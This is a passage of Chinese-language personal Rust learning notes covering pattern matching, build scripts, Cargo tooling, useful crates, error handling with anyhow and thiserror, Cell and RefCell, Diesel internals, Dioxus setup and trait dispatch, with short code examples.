<ul>
<li>每个带生命周期参数的输入参数，每个对应不同的生命周期参数；</li>
<li>如果只有一个输入参数带生命周期参数，那么返回值的生命周期被指定为这个参数；</li>
<li>如果有多个输入参数带生命周期参数，但其中有<code>&amp;self</code>、<code>&amp;mut self</code>，那么返回值的生命周期被指定为这个参数；</li>
<li>以上都不满足，就不能自动补全返回值的生命周期参数</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="模式匹配"><a class="header" href="#模式匹配">模式匹配</a></h1>
<p>凡是和C语言不一样的东西都令我费解啊。模式匹配是Rust的特性，非常的实用。</p>
<p>https://kaisery.github.io/trpl-zh-cn/ch18-03-pattern-syntax.html</p>
<p>模式匹配的全部语法：</p>
<ul>
<li>匹配字面量（demo 1）</li>
<li>匹配命名变量，并绑定（demo 1）</li>
<li>多个模式——或者 和 范围（demo 3）</li>
<li>也可以使用模式来解构结构体、枚举、元组和引用，以便使用这些值的不同部分。（demo 4）</li>
<li>匹配守卫（demo 2）</li>
<li>可反驳和不可反驳（demo 5）</li>
<li><em>@</em> 运算符（<code>@</code>）允许我们在创建一个存放值的变量的同时测试其值是否匹配模式。（demo 6）</li>
<li><a href="https://adventures.michaelfbryan.com/posts/daily/slice-patterns/#matching-the-start-of-a-slice">切片也可以匹配</a></li>
</ul>
<h2 id="match"><a class="header" href="#match">match</a></h2>
<center>demo 1</center>
<pre><pre class="playground"><code class="language-rust">match VALUE {
    PATTERN =&gt; EXPRESSION,
    PATTERN =&gt; EXPRESSION,    
    PATTERN =&gt; EXPRESSION,
}

fn main() {
    let x = Some(5);
    let y = 10;

    match x {
        Some(50) =&gt; println!(&quot;Got 50&quot;),					// 可以匹配常量
        Some(y) =&gt; println!(&quot;Matched, y = {:?}&quot;, y),	// 可以匹配并绑定变量
        _ =&gt; println!(&quot;Default case, x = {:?}&quot;, x),		// 默认情况
    }

    println!(&quot;at the end: x = {:?}, y = {:?}&quot;, x, y);
}
</code></pre></pre>
<p><code>match</code> 表达式必须是 <strong>穷尽</strong>（<em>exhaustive</em>）的，意为 <code>match</code> 表达式所有可能的值都必须被考虑到。有一个特定的模式 <code>_</code> 可以匹配所有情况，不过它从不绑定任何变量。</p>
<p><strong>匹配守卫</strong>（match guard）是一个指定于 match 分支模式之后的额外 if 条件，它也必须被满足才能选择此分支。匹配守卫用于表达比单独的模式所能允许的更为复杂的情况。如下：</p>
<center>demo 2</center>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let num = Some(4);

match num {
    Some(x) if x &lt; 5 =&gt; println!(&quot;less than five: {}&quot;, x),
    Some(x) =&gt; println!(&quot;{}&quot;, x),
    None =&gt; (),
}
<span class="boring">}
</span></code></pre></pre>
<p>除了简单的匹配，还可以有<strong>或者</strong>和<strong>范围</strong>。</p>
<center>demo 3</center>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 5;

// 或者
match x {
    1|2|3|4|5 =&gt; println!(&quot;one through five&quot;),
    _ =&gt; println!(&quot;something else&quot;),
}
// 范围，这个感觉是或者的语法糖
// 范围只允许用于数字或 char 值，因为编译器会在编译时检查范围不为空。char 和 数字值是 Rust 仅有的可以判断范围是否为空的类型。
match x {
    1..=5 =&gt; println!(&quot;one through five&quot;),
    _ =&gt; println!(&quot;something else&quot;),
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="let"><a class="header" href="#let">let</a></h2>
<p>let原本的样子：<code>let PATTERN = EXPRESSION;</code>所以</p>
<center>demo 4</center>
<pre><pre class="playground"><code class="language-rust">let i = 1;
let ref a:i32 = i;

// 这样可以同时绑定三个变量
let (x, y, z) = (1, 2, 3);	

// 这段代码创建了变量 a 和 b 来匹配结构体 p 中的 x 和 y 字段。
struct Point {
    x: i32,
    y: i32,
}
fn main() {
    let p = Point { x: 0, y: 7 };

    let Point { x: a, y: b } = p;
    assert_eq!(0, a);
    assert_eq!(7, b);
}

// 解构枚举，经常要解构Result和Option,下面两种写法是一样的
match ret {
    Some(x) =&gt; print!(&quot;{:?}&quot;,x),
    None =&gt; (),
}
if let Some(x) = ret {
    print!(&quot;{:?}&quot;,x);
}
// 所以说模式匹配还可以用来解构 struct,enum,tuple
</code></pre></pre>
<h2 id="if-let"><a class="header" href="#if-let">if let</a></h2>
<blockquote>
<p>模式有两种形式：refutable（可反驳的）和 irrefutable（不可反驳的）。能匹配任何传递的可能值的模式被称为是 <strong>不可反驳的</strong>（<em>irrefutable</em>）。一个例子就是 <code>let x = 5;</code> 语句中的 <code>x</code>，因为 <code>x</code> 可以匹配任何值所以不可能会失败。对某些可能的值进行匹配会失败的模式被称为是 <strong>可反驳的</strong>（<em>refutable</em>）。一个这样的例子便是 <code>if let Some(x) = a_value</code> 表达式中的 <code>Some(x)</code>；如果变量 <code>a_value</code> 中的值是 <code>None</code> 而不是 <code>Some</code>，那么 <code>Some(x)</code> 模式不能匹配。</p>
<p>函数参数、 <code>let</code> 语句和 <code>for</code> 循环只能接受不可反驳的模式，因为通过不匹配的值程序无法进行有意义的工作。<code>if let</code> 和 <code>while let</code> 表达式被限制为只能接受可反驳的模式，因为根据定义他们意在处理可能的失败：条件表达式的功能就是根据成功或失败执行不同的操作。</p>
</blockquote>
<p>有了let的模式匹配作为基础，我们可以来看<code>if let</code>. 下面的代码是错误的，编译器会告诉你没有穷尽匹配——显然，如果op2是None的话，那么m应该是什么呢？正确的写法应该是用<code>if let</code>，这就是<strong>可反驳和不可反驳</strong>显著的区别：</p>
<center>demo 5</center>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let op2 = Some(1);
// Error 在 Rust 要求不可反驳模式的地方使用可反驳模式
let Some(m) = op2;
... 
// Ok 当匹配成功的时候可以正确的执行{}内的代码
// 注意到m的作用域
if let Some(m) = op2 {
    ...
} 
// 匹配失败的时候可以把逻辑放在else中
else {
    
}
<span class="boring">}
</span></code></pre></pre>
<center>demo 6</center>
<pre><pre class="playground"><code class="language-rust">
#![allow(unused)]
fn main() {
    enum Message {
        Hello { id: i32 },
    }

    let msg = Message::Hello { id: 5 };

    match msg {
        Message::Hello { id: id_variable @ 3..=7 } =&gt; {
            println!(&quot;Found an id in range: {}&quot;, id_variable)
        },
        Message::Hello { id: 10..=12 } =&gt; {
            println!(&quot;Found an id in another range&quot;)
        },
        Message::Hello { id } =&gt; {
            println!(&quot;Found some other id: {}&quot;, id)
        },
    }
}
</code></pre></pre>
<hr />
<p><code>ref</code>和 <code>&amp;</code>有什么区别呢？看下面这个例子，<code>a</code>的类型全部都是<code>&amp;i32</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>	let ref a = i;
	let a = &amp;i;
	let &amp;a = &amp;&amp;i;
<span class="boring">}
</span></code></pre></pre>
<blockquote>
<p>单纯Rust语言上考虑。我们在不同情况下解释<code>&amp;</code>的意思：</p>
<ol>
<li>在表达式上，表示的是借用。</li>
<li>在变量绑定上，表示解地址操作与*类似。</li>
<li>在类型声明上，表示引用类型。</li>
<li>在模式匹配上，<strong>无效关键字</strong></li>
</ol>
<p>那么<code>ref</code>的通用解释是：</p>
<ol>
<li>在表达式上，<strong>无效关键字</strong>。</li>
<li>在变量绑定上，表示引用类型。</li>
<li>在类型声明上，<strong>无效关键字</strong>。</li>
<li>在模式匹配上，表示引用类型。</li>
</ol>
<p>非要给区分<code>ref</code>和<code>&amp;</code>到底哪个是引用，哪个是借用。我们可以先从词性划分，引用我归类为名词，而借用归类为动词。<code>&amp;A</code>在表达式上 表示借用A，这是一个动作，那结果就是产出一个引用类型。所以<code>let ref B</code>表示声明了一个引用类型，它只能绑定到某次借用动作上。</p>
<p>**所以<code>ref</code> 更适合叫引用， <code>&amp;</code>叫借用。**与之对应的有<code>ref mut</code>和<code>&amp;mut</code>。</p>
<p>作者：kayryu
链接：https://www.jianshu.com/p/ac519d8c5ec9</p>
</blockquote>
<p>函数的参数相当于一个隐式的let绑定。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="build"><a class="header" href="#build">Build</a></h1>
<p><code>build.rs</code>是Rust的构建脚本，有点像Makefile。要使用它，在<code>Cargo.toml</code>文件下加入下面的字段。注意这个路径是相对于Cargo.toml文件的路径。<strong>build.rs将在编译其他内容之前，被编译和调用</strong>。</p>
<pre><code class="language-toml">[package]
# ...
build = &quot;build.rs&quot;
</code></pre>
<p>build.rs经常用来: </p>
<ul>
<li>Building a bundled C library.</li>
<li>Finding a C library on the host system.</li>
<li>Generating a Rust module from a specification.</li>
<li>Performing any platform-specific configuration needed for the crate.</li>
</ul>
<h2 id="实用crate"><a class="header" href="#实用crate">实用crate</a></h2>
<p><a href="https://crates.io/keywords/build-dependencies">更多的实用工具</a></p>
<ul>
<li><a href="https://crates.io/crates/bindgen"><code>bindgen</code></a> — Automatically generate Rust FFI bindings to C libraries.</li>
<li><a href="https://crates.io/crates/cc"><code>cc</code></a> — Compiles C/C++/assembly.</li>
<li><a href="https://crates.io/crates/pkg-config"><code>pkg-config</code></a> — Detect system libraries using the <code>pkg-config</code> utility.</li>
<li><a href="https://crates.io/crates/cmake"><code>cmake</code></a> — Runs the <code>cmake</code> build tool to build a native library.</li>
<li><a href="https://crates.io/crates/autocfg"><code>autocfg</code></a>, <a href="https://crates.io/crates/rustc_version"><code>rustc_version</code></a>, <a href="https://crates.io/crates/version_check"><code>version_check</code></a> — These crates provide ways to implement conditional compilation based on the current <code>rustc</code> such as the version of the compiler.</li>
</ul>
<hr />
<p>https://doc.rust-lang.org/cargo/reference/build-script-examples.html </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cargo"><a class="header" href="#cargo">Cargo</a></h1>
<p>让Cargo帮你写代码，介绍Cargo的使用和一些有用的第三方包。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="clippy"><a class="header" href="#clippy">Clippy</a></h1>
<p>Clippy - A collection of lints to catch common mistakes and improve your Rust code.</p>
<p>他是真的手把手教你怎么写代码，Rust的最佳实践是什么。</p>
<h2 id="原理-2"><a class="header" href="#原理-2">原理</a></h2>
<p><a href="https://doc.rust-lang.org/nightly/nightly-rustc/rustc_lint/trait.LateLintPass.html#">LateLintPass</a>是基于HIR的分析。</p>
<hr />
<p>参考链接：http://jamesmcm.github.io/blog/2022/03/26/my-first-clippy-lint/</p>
<p>https://rustc-dev-guide.rust-lang.org/compiler-src.html#the-main-stages-of-compilation</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cargo-fix"><a class="header" href="#cargo-fix">Cargo fix</a></h1>
<p>cargo-fix - Automatically fix lint warnings reported by rustc</p>
<h2 id="example---remove-useless-import"><a class="header" href="#example---remove-useless-import">Example - remove useless import</a></h2>
<p>需要这个子命令，其实是因为一个需求，要重构屎山，Leader让我把删除一个preclude文件里。于是我就想把里面的所有use都复制一份，然后在删除unused import。</p>
<p>这个命令可以满足我的需求。把所有复制了use了代码add到staged。--lib是因为整个项目的单元测试年久失修根本编译不过，呵呵。</p>
<pre><code class="language-shell">cargo fix --allow-staged --package view-videochat --lib
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cargo-make"><a class="header" href="#cargo-make">Cargo make</a></h1>
<p>代替你的make和Makefile</p>
<pre><code class="language-shell">cargo install --force cargo-make
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><p>AST -&gt; HIR -&gt; MIR</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="crates"><a class="header" href="#crates">Crates</a></h1>
<p>学习一个库设计的好办法是，先想想如果你来设计这个功能，你会怎么做。</p>
<h2 id="小库"><a class="header" href="#小库">小库</a></h2>
<ul>
<li><a href="https://crates.io/crates/bitflags">bitflags </a>: A macro to generate structures which behave like bitflags.</li>
<li><a href="https://docs.rs/anyhow/latest/anyhow/">anyhow</a>: 错误处理</li>
<li><a href="https://crates.io/crates/hex-literal">hex-literal</a>: 帮你在编译期把十六进制数字符串转换成byte array。</li>
<li><a href="https://crates.io/crates/tempfile">tempfile</a>: 生成临时文件，测试的时候尤其好用。</li>
</ul>
<h2 id="基础库"><a class="header" href="#基础库">基础库</a></h2>
<p>这些库可以解决很多小问题。</p>
<ul>
<li><a href="https://crates.io/crates/regex">regex</a>: 正则表达式。</li>
<li><a href="https://crates.io/crates/lazy_static">lazy_static </a>: A macro for declaring lazily evaluated statics in Rust。</li>
<li><a href="https://crates.io/crates/rand">rand </a>和<a href="https://crates.io/crates/rand_core">rand_core </a>: 随机数生成，前者提供了一个实用的库，后者提供了抽象接口。</li>
<li><a href="https://crates.io/crates/serde">serde</a>: A generic serialization/deserialization framework. 和<a href="https://crates.io/crates/serde_json">serde_json </a>等配合使用。</li>
<li><a href="https://crates.io/crates/libc">libc</a>: Raw FFI bindings to platform libraries like libc.</li>
</ul>
<h2 id="应用构建"><a class="header" href="#应用构建">应用构建</a></h2>
<ul>
<li><a href="https://crates.io/crates/clap">clap</a>: CLI应用构建。</li>
<li><a href="https://crates.io/crates/cursive">cursive</a>: TUI应用构建。</li>
<li><a href="https://dioxuslabs.com/">dioxus</a>: GUI应用构建。</li>
</ul>
<h2 id="进阶"><a class="header" href="#进阶">进阶</a></h2>
<ul>
<li><a href="https://crates.io/crates/nom">nom</a>: 解析协议。很有学习价值。</li>
<li><a href="https://crates.io/crates/pest">pest</a>: 解析协议。 </li>
<li><a href="https://crates.io/crates/tokio">tokio</a>: 异步框架，适合IO bound的程序。</li>
<li><a href="https://crates.io/crates/rayon">rayon</a>: 异步框架，适合CPU bound的程序。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="anyhow--thiserror"><a class="header" href="#anyhow--thiserror">AnyHow &amp; ThisError</a></h1>
<p>两个库都是用来处理错误的好帮手，AnyHow简单方便，ThisError帮助我们创建完备的错误类型。</p>
<h2 id="anyhow"><a class="header" href="#anyhow"><a href="https://crates.io/crates/anyhow">AnyHow</a></a></h2>
<h3 id="使用方法"><a class="header" href="#使用方法">使用方法</a></h3>
<ul>
<li>
<p>在使用上来说，把任何可能会失败的函数(fallible function)，把返回值的类型设置成<code>Result&lt;T, anyhow::Error&gt;</code>，或者等价的<code>anyhow::Result&lt;T&gt;</code>。</p>
<p>在函数内，就可以用<code>?</code>将任何implement了<code>std::error::Error</code>的错误传递出来。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use anyhow::Result;

fn get_cluster_info() -&gt; Result&lt;ClusterMap&gt; {
    let config = std::fs::read_to_string(&quot;cluster.json&quot;)?;
    let map: ClusterMap = serde_json::from_str(&amp;config)?;
    Ok(map)
}
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>附加context来帮助触发了error的人来理解哪里不对了。尤其是一些low level的错误比如&quot;No such file or directory&quot;更需要增加一些信息。</p>
<pre><pre class="playground"><code class="language-rust">use anyhow::{Context, Result};

fn main() -&gt; Result&lt;()&gt; {
    ...
    it.detach().context(&quot;Failed to detach the important thing&quot;)?;

    let content = std::fs::read(path)
        .with_context(|| format!(&quot;Failed to read instrs from {}&quot;, path))?;
    ...
}
</code></pre></pre>
<pre><code>Error: Failed to read instrs from ./path/to/instrs.json

Caused by:
    No such file or directory (os error 2)
</code></pre>
</li>
<li>
<p>Downcasting支持by value, by shared reference, by mutable reference.</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// If the error was caused by redaction, then return a
// tombstone instead of the content.
match root_cause.downcast_ref::&lt;DataStoreError&gt;() {
    Some(DataStoreError::Censored(_)) =&gt; Ok(Poll::Ready(REDACTED_CONTENT)),
    None =&gt; Err(error),
}
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
<h3 id="使用场景-2"><a class="header" href="#使用场景-2">使用场景</a></h3>
<p>如果是位于应用的最上层，或者简单写个脚本只想<code>?</code>一把梭，那用Anyhow就可以了。</p>
<h2 id="thiserror"><a class="header" href="#thiserror"><a href="https://docs.rs/thiserror/latest/thiserror/">ThisError</a></a></h2>
<h3 id="使用方法-1"><a class="header" href="#使用方法-1">使用方法</a></h3>
<p>提供了过程宏帮助我们创建自定义的错误类型。他这里的过程宏有点DSL的感觉了。虽然他说他是支持Enum/Struct的，不过感觉大部分情况错误用Enum的和类型比较合适，表达各种各样的错误嘛。</p>
<ul>
<li><code>#[derive(thiserror::Error)]</code>帮助我们实现<code>std::error::Error</code>。</li>
<li><code>#[error(&quot;format string&quot;)]</code>帮助我们实现<code>Display</code>。</li>
<li><code>#[from] xxError</code>帮助我们实现<code>From&lt;xxError&gt;</code>，以及<code>std::error::Error</code>中的<code>source</code>方法。</li>
<li><code>#[source]</code>帮助我们实现<code>std::error::Error</code>中的<code>source</code>方法（返回另一个错误类型，表示产生这个错误的根本原因）。</li>
<li><code>#[backtrace]</code>帮助我们实现<code>std::error::Error</code>中的<code>backtrace</code>方法（貌似是做栈展开之用<sup class="footnote-reference"><a href="#backtrace">1</a></sup>）。</li>
<li><code>#[error(transparent)]</code>帮我我们直接将错误传过来，典型用法是给未定义的错误进行兜底操作。</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Error, Debug)]
pub enum MyError {
    ...

    #[error(transparent)]
    Other(#[from] anyhow::Error),  
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="使用场景-3"><a class="header" href="#使用场景-3">使用场景</a></h3>
<p>需要详细完备的错误信息，又懒得做手动去敲重复代码的重复性工作，比如一些底层库的构建。</p>
<div class="footnote-definition" id="backtrace"><sup class="footnote-definition-label">1</sup>
<p>https://doc.rust-lang.org/std/backtrace/index.html</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cell"><a class="header" href="#cell">Cell</a></h1>
<p>Rust为了保证并发安全，有一个很重要的原则：可变不共享，共享不可变。或者说同时只能有一个写者或多个读者。在标准库中是这样描述的：</p>
<blockquote>
<p>Rust memory safety is based on this rule: Given an object <code>T</code>, it is only possible to have one of the following:</p>
<ul>
<li>Having several immutable references (<code>&amp;T</code>) to the object (also known as <strong>aliasing</strong>).</li>
<li>Having one mutable reference (<code>&amp;mut T</code>) to the object (also known as <strong>mutability</strong>).</li>
</ul>
</blockquote>
<p>但是，这样也降低了开发的灵活性。有时，我们想在共享的情况下实现可变呢？或者是部分可变呢？Rust为我们提供了<code>Cell</code>,<code>RefCell</code>,<code>Mutex</code>,<code>RwLock</code>,<code>Atomic*</code>等具有<strong>内部可变性</strong>的容器。其中<code>Cell</code>和<code>RefCell</code>用于单线程，后三者用于多线程。</p>
<h2 id="cellt-and--refcellt"><a class="header" href="#cellt-and--refcellt"><a href="https://doc.rust-lang.org/std/cell/struct.Cell.html"> <code>Cell&lt;T&gt;</code></a> and  <a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html"><code>RefCell&lt;T&gt;</code></a></a></h2>
<p><code>Cell</code> 通过 moving values in and out of the <code>Cell</code> 来实现内部可变性。来看他的接口。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;T&gt; Cell&lt;T&gt; {
    pub fn get_mut(&amp;mut self) -&gt; &amp;mut T {}
    pub fn set(&amp;self, val:T) {}
    pub fn swap(&amp;self, other: &amp;Self) {}
    pub fn replace(&amp;self, val:T) -&gt; T {}
    pub fn into_inner(self) -&gt; T {}
}
impl &lt;T:Copy&gt; Cell&lt;T&gt; {
    pub fn get(&amp;self) -&gt; T {}
}
<span class="boring">}
</span></code></pre></pre>
<p><code>get_mut</code>获得一个可变引用，根据Rust的规则我们只能同时有一个可变引用。<code>get</code>针对的是实现了<code>Copy</code>的对象，每次把内部的数据<code>memcpy</code>了一份出去。可以发现，我们<strong>没法直接得到指向内部数据的引用</strong>，而是直接获得内部的数据。</p>
<p>想要获得reference而不是value，我们使用<code>RefCell</code>。看看他的主要接口</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl &lt;T: ?Sized&gt; RefCEll&lt;T&gt; {
    pub fn borrow(&amp;self) -&gt; Ref&lt;T&gt; {}
    pub fn try_borrow(&amp;self) -&gt; Result&lt;Ref&lt;T&gt;, BorrowError&gt; {}
    pub fn borrow_mut(&amp;self) -&gt; RefMut&lt;T&gt; {}
    pub fn try_borrow_mut(&amp;self) -&gt; Result&lt;RefMut&lt;T&gt;, BorrowMutError&gt; {}
    pub fn get_mut(&amp;self) -&gt; &amp;mut T {}
}
<span class="boring">}
</span></code></pre></pre>
<p>这里的<code>borrow</code>和<code>borrow_mut</code>，返回的<code>Ref&lt;T&gt;</code>和<code>RefMut&lt;T&gt;</code>，恰如<code>&amp;T</code>和<code>&amp;mut T</code>，他们是智能指针，Rust的自动解引用让我们用起来就和普通的引用一样。所以我们执行下面的代码会发生什么事情呢？</p>
<pre><pre class="playground"><code class="language-rust">use std::cell::RefCell;
fn main() {
    let a = RefCell::new(1);
    let p1 = a.borrow();
    let p2 = a.borrow_mut();
}
</code></pre></pre>
<p>答案是panic，在我们试图获得<code>RefMut</code>的时候，会出现错误如下。原因也很好理解，可变不共享嘛。所以<code>try_borrow</code>和<code>try_borrow_mut</code>也很好理解了，就是错误的处理方式不同而已。你也可以这样理解，<strong><code>RefCell</code>把编译期的“可变不共享，共享不可变”移到了运行时</strong>。</p>
<pre><code>thread 'main' panicked at 'already borrowed: BorrowMutError', src/main.rs:5:16
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="diesel"><a class="header" href="#diesel">Diesel</a></h1>
<h2 id="apis"><a class="header" href="#apis">APIs</a></h2>
<h2 id="from-replace_into"><a class="header" href="#from-replace_into">From <code>replace_into</code></a></h2>
<p>从diesel代码的replace_into入手，看看他是怎么封装的。我们一般的使用方法如下：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>diesel::replace_into(dsl::settings)
    .values(&amp;s)
    .execute(conn)?;
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>使用建造者模式，首先我们可以通过<code>diesel::replace_into</code>构造一个<a href="https://docs.diesel.rs/master/diesel/query_builder/struct.IncompleteInsertStatement.html"><code>IncompleteInsertStatement</code></a>，他是一个Builder。</li>
<li>然后通过<code>values</code>方法构造一个<a href="https://docs.diesel.rs/master/diesel/query_builder/struct.InsertStatement.html"><code>InsertStatement</code></a>。这个结构就已经带有一个<code>INSERT</code>语句的必要信息了。</li>
</ul>
<p>我们构造完了一个INSERT语句，然后才是执行它。Diesel抽象了一个trait <code>ExecuteDsl</code>，通过实现它来指定具体的执行SQL语句的方法。这个泛型属实是让人看晕了。。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl&lt;V, T, QId, C, Op, O, const STATIC_QUERY_ID: bool&gt; ExecuteDsl&lt;C, Sqlite&gt;
    for InsertStatement&lt;T, BatchInsert&lt;Vec&lt;ValuesClause&lt;V, T&gt;&gt;, T, QId, STATIC_QUERY_ID&gt;, Op&gt;
where
    T: QuerySource,
    C: Connection&lt;Backend = Sqlite&gt;,
    V: ContainsDefaultableValue&lt;Out = O&gt;,
    O: Default,
    (O, Self): ExecuteDsl&lt;C, Sqlite&gt;,
{
    fn execute(query: Self, conn: &amp;mut C) -&gt; QueryResult&lt;usize&gt; {
        &lt;(O, Self) as ExecuteDsl&lt;C, Sqlite&gt;&gt;::execute((O::default(), query), conn)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>最后是绕到了<code>Connection::execute_returning_count</code>方法。来看我们使用的Connection是对不同数据库连接的抽象，来看我们使用的SQLite他是怎么做的。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Connection for SqliteConnection {
  ...
  fn execute_returning_count&lt;T&gt;(&amp;mut self, source: &amp;T) -&gt; QueryResult&lt;usize&gt;
  where
  T: QueryFragment&lt;Self::Backend&gt; + QueryId,
  {
    let statement_use = self.prepared_query(source)?;
    statement_use.run()?;

    Ok(self.raw_connection.rows_affected_by_last_query())
  }
}
<span class="boring">}
</span></code></pre></pre>
<p>对应于SQLite的接口</p>
<pre><code class="language-c">// 可以理解为编译SQL语句，会有缓存。
sqlite3_prepare_v3();
// 绑定参数
sqlite3_bind_*();
// 这里只执行了1次step ?
sqlite3_step();
sqlite3_change();
</code></pre>
<p>其中的run的代码是，看代码只执行了一次step~~，我不是很理解？是因为Insert语句只需要执行一次吗~~，因为select语句只需要执行一次step。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub(super) fn run(mut self) -&gt; QueryResult&lt;()&gt; {
  unsafe {
    // This is safe as we pass `first_step = true`
    // and we consume the statement so nobody could
    // access the columnns later on anyway.
    self.step(true).map(|_| ())
  }
}
pub(super) unsafe fn step(&amp;mut self, first_step: bool) -&gt; QueryResult&lt;bool&gt; {
  let res = match ffi::sqlite3_step(self.statement.statement.inner_statement.as_ptr()) {
    ffi::SQLITE_DONE =&gt; Ok(false),
    ffi::SQLITE_ROW =&gt; Ok(true),
    _ =&gt; Err(last_error(self.statement.statement.raw_connection())),
  };
  if first_step {
    self.column_names = OnceCell::new();
  }
  res
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dioxus"><a class="header" href="#dioxus">Dioxus</a></h1>
<h2 id="environment"><a class="header" href="#environment">Environment</a></h2>
<ol>
<li>
<p><a href="https://www.rust-lang.org/zh-CN/learn/get-started">安装Rust环境</a>。</p>
<pre><code>curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
</code></pre>
</li>
<li>
<p>安装<code>dioxus-cli</code>和<code>cargo-edit</code></p>
<pre><code>cargo install cargo-edit 
cargo install dioxus-cli
</code></pre>
</li>
<li>
<p>安装<a href="https://dioxuslabs.com/guide/setup.html">必要的依赖库</a>。例如Ubuntu就可以下执行以下命令</p>
<pre><code>sudo apt install libwebkit2gtk-4.0-dev libgtk-3-dev libappindicator3-dev
</code></pre>
</li>
<li>
<p>在<code>Cargo.toml</code>声明必要的依赖，在<code>cargo-edit</code>的帮助下，只需要在工程目录下执行以下命令即可</p>
<pre><code>cargo add dioxus --features desktop
</code></pre>
</li>
</ol>
<h2 id="core-topic"><a class="header" href="#core-topic">Core Topic</a></h2>
<blockquote>
<p>At a very high level, Dioxus is simply a Rust framework for <em>declaring</em> user interfaces and <em>reacting</em> to changes.</p>
<ol>
<li>We declare what we want our user interface to look like given a state using Rust-based logic and control flow.</li>
<li>We declare how we want our state to change when the user triggers an event.</li>
</ol>
</blockquote>
<p>站在高层次来看，Dioxus只是一个Rust框架，用来<strong>描述用户界面</strong>和<strong>响应用户动作</strong>。我们声明，在一个**状态(state)**下界面的外观，以及状态如何随用户的动作改变。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dispatch"><a class="header" href="#dispatch">Dispatch</a></h1>
<p>在Rust中，想为一个通用的类型编写代码，一般有使用泛型和使用Trait Object两种方式。</p>
<p>比如，我们定义一个trait <code>Voice</code>，然后为struct <code>Cat</code>和<code>Cow</code>实现它。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>trait Voice {
    fn voice(&amp;self);
}
struct Cat;
impl Voice for Cat {
    fn voice(&amp;self) {
        println!(&quot;Meow&quot;);
    }
}

struct Cow;
impl Voice for Cow {
    fn voice(&amp;self) {
        println!(&quot;Moo&quot;);
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>然后，当我们想为满足了Voice的类编写通用代码时，可以使用Trait Object，也就是动态分发，实现机制类似于C++，<code>&amp;dyn Voice</code>指向的内容中会有一个Virtual Table。</p>
<pre><pre class="playground"><code class="language-rust">fn hello(animal: &amp;dyn Voice) {
    animal.voice();
    ...
}
fn main() {
    let cat = Cat{};
    let cow = Cow{};
    hello(&amp;cat);
    hello(&amp;cow);
}
</code></pre></pre>
<p>也可以使用泛型，也就是静态分发，会为每一种具体的类型实现代码，效率高（相对于动态派发，少了额外的指针解引用），但是会造成代码膨胀</p>
<pre><pre class="playground"><code class="language-rust">// 另外一种写法可能更熟悉一点
// fn hello&lt;T:Voice&gt;(animal: &amp;T) {
fn hello(animal: &amp;impl Voice) {
    animal.voice();
    ...
}
fn main() {
    let cat = Cat{};
    let cow = Cow{};
    hello(&amp;cat);
    hello(&amp;cow);
}
</code></pre></pre>
<p>除此之外，还有一个办法，就是利用Enum来实现，如下，性能会比动态配发高，也不会有代码膨胀。这里的Enum相当于是为具体的类型打了一个标签。</p>
<pre><pre class="playground"><code class="language-rust">enum Animal{
    Cat_(Cat), 
    Cow_(Cow)
}
impl Voice for Animal {
    fn voice(&amp;self) {
        match self {
            Animal::Cat_(cat) =&gt; cat.voice(),
            Animal::Cow_(cow) =&gt; cow.voice(),
        }
    }
}
fn hello(animal: &amp;Animal) {
    animal.voice();
}
fn main() {
    let cat = Animal::Cat_(Cat{});
    let cow = Animal::Cow_(Cow{});
    hello(&amp;cat);
    hello(&amp;cow);
}
</code></pre></pre>
<p>相信你也看出问题了，代码有点繁琐。不过主要问题是，那我每次新加一个类，岂不是要对之前的类型和实现都做改变，提高维护成本。(这里的代码比较简单不明显)</p>
<h2 id="enum_dispatch"><a class="header" href="#enum_dispatch">enum_dispatch</a></h2>
